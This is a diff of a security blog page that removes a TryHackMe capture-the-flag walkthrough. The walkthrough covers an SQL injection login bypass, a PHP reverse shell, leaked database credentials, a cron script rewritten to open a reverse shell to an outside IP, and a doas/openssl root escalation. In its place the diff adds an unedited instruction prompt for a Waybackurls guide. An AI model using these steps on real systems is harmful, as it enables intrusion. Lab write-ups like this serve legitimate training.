@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Plotted Tms | Technical Intelligence Labs</title>
+    <title>Waybackurls Command List | Technical Intelligence Labs</title>
     <link rel="stylesheet" href="../css/custom.css">
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -106,141 +106,36 @@
         <!-- Post Header -->
         <header class="mb-12 border-b border-slate-800 pb-12">
             <div class="flex items-center gap-4 text-xs font-mono text-slate-500 mb-6 uppercase tracking-widest">
-                <span class="px-2 py-1 bg-slate-900 border border-slate-800 rounded text-accent-green">tryhackme</span>
-                <span>// 2024-12-30</span>
-                <span>// ID: REF-Plotted Tms</span>
+                <span class="px-2 py-1 bg-slate-900 border border-slate-800 rounded text-accent-green">commands</span>
+                <span>// 2026-01-05</span>
+                <span>// ID: REF-Waybackurls Command List</span>
             </div>
             
-            <h1 class="text-3xl md:text-5xl font-bold text-white mb-8 leading-tight font-mono">Plotted Tms</h1>
+            <h1 class="text-3xl md:text-5xl font-bold text-white mb-8 leading-tight font-mono">Waybackurls Command List</h1>
             
             <div class="flex flex-wrap gap-2">
                 <!-- Tags populated by python -->
-                <!-- tryhackme, ctf -->
+                <!-- waybackurls, cybersecurity, command reference, beginner -->
             </div>
         </header>
 
         <!-- Markdown Body -->
         <div class="markdown-content">
             <hr />
-<pre class="codehilite"><code>PORT    STATE SERVICE REASON         VERSION
-22/tcp  open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-80/tcp  open  http    syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
-445/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
-</code></pre>
-
-<pre class="codehilite"><code>http://10.66.179.166/passwd
-
-`bm90IHRoaXMgZWFzeSA6RA==`
-</code></pre>
-
-<pre class="codehilite"><code>http://10.66.179.166/admin/id_rsa
-
-`VHJ1c3QgbWUgaXQgaXMgbm90IHRoaXMgZWFzeS4ubm93IGdldCBiYWNrIHRvIGVudW1lcmF0aW9uIDpE`
-</code></pre>
-
-<pre class="codehilite"><code>http://10.66.179.166:445/management/admin/login.php
-</code></pre>
-
-<blockquote>
-<p>This login forum injectable i use <code>' or 1=1 -- -</code> and can be login and I add and run phpreverseshell</p>
-</blockquote>
-<pre class="codehilite"><code>www-data@plotted:/home/plot_admin$ cat user.txt
-cat: user.txt: Permission denied
-</code></pre>
-
-<pre class="codehilite"><code>www-data@plotted:/var/www/scripts$ cat /etc/crontab
-
-# Unlike any other crontab you don't have to run the `crontab'
-# command to install the new version when you edit this file
-# and files in /etc/cron.d. These files also have username fields,
-# that none of the other crontabs do.
-
-SHELL=/bin/sh
-PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
-
-# Example of job definition:
-# .---------------- minute (0 - 59)
-# |  .------------- hour (0 - 23)
-# |  |  .---------- day of month (1 - 31)
-# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
-# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
-# |  |  |  |  |
-# *  *  *  *  * user-name command to be executed
-17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
-25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
-47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
-52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
-* *     * * *   plot_admin /var/www/scripts/backup.sh
-#
-</code></pre>
-
-<pre class="codehilite"><code>www-data@plotted:/var/www/html/445/management$ cat initialize.php
-&lt;?php
-$dev_data = array('id'=&gt;'-1','firstname'=&gt;'Developer','lastname'=&gt;'','username'=&gt;'dev_oretnom','password'=&gt;'5da283a2d990e8d8512cf967df5bc0d0','last_login'=&gt;'','date_updated'=&gt;'','date_added'=&gt;'');
-if(!defined('base_url')) define('base_url','/management/');
-if(!defined('base_app')) define('base_app', str_replace('\\','/',__DIR__).'/' );
-if(!defined('dev_data')) define('dev_data',$dev_data);
-if(!defined('DB_SERVER')) define('DB_SERVER',&quot;localhost&quot;);
-if(!defined('DB_USERNAME')) define('DB_USERNAME',&quot;tms_user&quot;);
-if(!defined('DB_PASSWORD')) define('DB_PASSWORD',&quot;Password@123&quot;);
-if(!defined('DB_NAME')) define('DB_NAME',&quot;tms_db&quot;);
-?&gt;
-</code></pre>
-
-<pre class="codehilite"><code>www-data@plotted:/var/www/scripts$ ls
-backup.sh
-</code></pre>
-
-<pre class="codehilite"><code>www-data@plotted:/var/www/scripts$ rm backup.sh
-rm: remove write-protected regular file 'backup.sh'? yes
-www-data@plotted:/var/www/scripts$ ls
-www-data@plotted:/var/www/scripts$ set +H
-www-data@plotted:/var/www/scripts$ echo '#!/bin/bash
-&gt; bash -i &gt;&amp; /dev/tcp/192.168.153.193/4444 0&gt;&amp;1' &gt; backup.sh
-www-data@plotted:/var/www/scripts$ chmod +x backup.sh
-www-data@plotted:/var/www/scripts$ ls -la
-total 12
-drwxr-xr-x 2 www-data www-data 4096 Dec 21 08:27 .
-drwxr-xr-x 4 root     root     4096 Oct 28  2021 ..
--rwxrwxrwx 1 www-data www-data   58 Dec 21 08:27 backup.sh
-www-data@plotted:/var/www/scripts$ ./backup.sh
-</code></pre>
-
-<blockquote>
-<p>Wait Few Seconds...</p>
-</blockquote>
-<pre class="codehilite"><code>user.txt
-plot_admin@plotted:~$ cat user.txt
-</code></pre>
-
-<pre class="codehilite"><code>find / -user root -perm /4000
-/usr/bin/passwd
-/usr/bin/sudo
-/usr/bin/gpasswd
-/usr/bin/mount
-/usr/bin/su
-/usr/bin/chfn
-/usr/bin/fusermount
-/usr/bin/chsh
-/usr/bin/umount
-/usr/bin/doas
-/usr/bin/newgrp
-</code></pre>
-
-<pre class="codehilite"><code> cat /etc/doas.conf 
-permit nopass plot_admin as root cmd openssl
-plot_admin@plotted:/$ LFILE=/etc/passwd
-&lt;sh” | doas -u root openssl enc -out “$LFILE”|
-&gt; ^C
-plot_admin@plotted:/$ doas openssl enc -in &quot;/root/root.txt&quot;
-Congratulations on completing this room!
-
-53f85e2da...............
-
-Hope you enjoyed the journey!
-
-Do let me know if you have any ideas/suggestions for future rooms.
-</code></pre>
+<h1>Waybackurls Command Guide</h1>
+<p>Please generate a detailed educational guide for the <strong>Waybackurls</strong> tool.<br />
+Follow this structure exactly:</p>
+<ol>
+<li><strong>Brief Explanation</strong>: Explain what Waybackurls is and why it's used in cybersecurity.</li>
+<li><strong>Top 10 Useful Commands</strong>: List the 10 most common/useful commands for this tool.<ul>
+<li>For EACH command, provide the exact syntax in a code block.</li>
+<li>Explain what each flag does (<code>-x</code>, <code>-u</code>, etc.).</li>
+<li>Explain the <em>output</em> and <em>why</em> you would use this specific command.</li>
+</ul>
+</li>
+<li><strong>The Most Powerful Command</strong>: Highlight the single most powerful or "all-in-one" command for this tool and explain its power.</li>
+</ol>
+<p><strong>Tone</strong>: Educational, for a beginner student.</p>
         </div>
     </main>
 
